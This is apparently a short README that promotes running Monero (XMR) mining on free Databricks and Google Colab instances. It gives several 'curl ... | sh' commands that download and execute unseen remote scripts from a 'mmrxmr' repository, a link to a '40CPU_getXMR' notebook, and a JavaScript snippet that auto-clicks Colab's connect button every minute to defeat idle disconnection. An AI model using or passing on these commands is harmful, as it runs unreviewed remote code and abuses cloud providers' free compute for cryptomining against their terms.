# Edit + Copy + Paste 👉🏻 [Click here for Tutorial](https://aank.me/Youtube)
* Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
```markdown
cd /root
curl https://raw.githubusercontent.com/PUE45/mmrxmr/main/databricks.sh | sh
```
* Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
```markdown
curl https://raw.githubusercontent.com/PUE45/mmrxmr/main/gcolab-sg.sh | sh
```
```markdown CPU
curl https://raw.githubusercontent.com/PUE45/mmrxmr/main/gcolab-us.sh | sh
```
```markdown
curl https://raw.githubusercontent.com/PUE45/mmrxmr/main/nvidiacolab-us.sh | sh
```
* Try Free [40 CPU GColab to get XMR](https://colab.research.google.com/github/PUE45/mmrxmr/blob/main/40CPU_getXMR.ipynb)
 
* Try Free [GPU Check]

* Try Free [SSH Using Ngrok]

* Auto Reconnect GColab:
```markdown
var startClickConnect = function startClickConnect(){ var clickConnect = function clickConnect(){ console.log("Connnect Clicked - Start"); document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click(); console.log("Connnect Clicked - End"); }; var intervalId = setInterval(clickConnect, 60000); var stopClickConnectHandler = function stopClickConnect() { console.log("Connnect Clicked Stopped - Start"); clearInterval(intervalId); console.log("Connnect Clicked Stopped - End"); }; return stopClickConnectHandler; }; var stopClickConnect = startClickConnect();
```
